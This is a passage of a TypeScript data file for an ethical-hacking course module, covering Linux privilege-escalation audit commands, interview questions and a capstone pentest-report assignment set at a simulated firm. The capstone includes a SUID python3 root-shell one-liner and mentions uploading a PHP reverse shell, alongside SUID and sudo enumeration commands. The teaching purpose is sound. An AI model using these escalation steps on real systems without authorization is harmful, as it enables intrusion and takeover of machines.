        { term: "Executive Summary", definition: "A high-level overview in a penetration test report designed for business leadership, framing risks in financial and operational terms." }
      ],
      importantCommands: [
        { command: "find / -perm -u=s -type f 2>/dev/null", usage: "Enumerate all Linux binaries with SUID root permissions enabled", purpose: "SUID Privilege Audit" },
        { command: "sudo -l", usage: "List allowed sudo commands for current user without requiring root password", purpose: "Sudo Rights Audit" },
        { command: "cat /etc/crontab", usage: "Inspect scheduled system cron jobs for writable scripts", purpose: "Cron Job Audit" }
      ],
      interviewPoints: [
        "Walk me through your methodology when you land a low-privilege `www-data` shell on an unknown Linux server.",
        "How do you communicate a critical-severity vulnerability to a non-technical CEO versus a senior engineering lead?",
        "What is the difference between a Vulnerability Assessment report and a formal Penetration Test Executive Deliverable?"
      ],
      commonMistakes: [
        "Focusing exclusively on technical jargon in the executive summary instead of addressing business risks, regulatory compliance, and brand reputation.",
        "Failing to provide clear, reproducible proof-of-concept steps that developers can use to verify fixes.",
        "Recommending generic solutions ('apply patches') instead of specific, defensible engineering recommendations (e.g. 'upgrade Apache to 2.4.52 and restrict SUID permissions on `/usr/bin/find`')."
      ]
    },
    assignment: {
      title: "The Ultimate Red Team Capstone: Penetration Test Deliverable",
      type: "Red Team Capstone Project",
      objective: "Document a complete end-to-end penetration test simulation from initial OSINT through remote exploitation, privilege escalation, and executive reporting.",
      difficulty: "HARD",
      estimatedTime: "45 mins",
      maxScore: 100,
      instructions: [
        "Scenario: You successfully completed an authorized pentest on simulated fintech firm NovaPay Corp.",
        "Attack Narrative: 1) Passive OSINT revealed unpatched Apache on port 80; 2) Directory fuzzing found `/admin/upload.php`; 3) Uploaded PHP reverse shell yielding low-privilege `www-data` shell; 4) Discovered `/usr/bin/python3` with SUID root bit set; 5) Elevated to root via `python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'`.",
        "1. Write the formal Executive Summary (1-page overview for the Board of Directors with risk ratings and business impact).",
        "2. Document the Technical Attack Chain with reproducible commands and proof-of-concept evidence.",
        "3. Provide the definitive remediation plan prioritizing immediate 24-hour fixes and long-term 90-day architectural improvements."
      ],
      expectedOutput: "A complete, board-ready Penetration Testing Final Report comprising: Executive Summary, Overall Risk Matrix, Technical Attack Narrative with SUID root escalation, and 30-60-90 Day Remediation Roadmap.",
      evaluationCriteria: [
        "Executive language translating technical exploits into business and regulatory risks",
        "Accurate technical documentation of reverse shell and SUID privilege escalation",
        "Actionable, prioritized remediation roadmap with short-term virtual patches and long-term architectural controls"
      ],
      challengeSnippet: "CAPSTONE_ENGAGEMENT_#115: Client: NovaPay Corp. Target IP: 10.10.10.150. Initial Shell: www-data. SUID Binary: /usr/bin/python3. Flag Captured: /root/proof.txt."
    }
  }
];

export const ETHICAL_HACKING_MODULES_DATA: ModuleData[] = RAW_ETHICAL_HACKING_MODULES.map(mod => {
  const dayIndex = mod.id - 100;
  const enrichment = ETHICAL_HACKING_ENRICHMENTS_MAP[dayIndex];
  return {
    ...mod,
    notes: {
      ...mod.notes,
      topicBreakdowns: enrichment?.topicBreakdowns || [],
      caseStudy: enrichment?.caseStudy
    }
  };
});
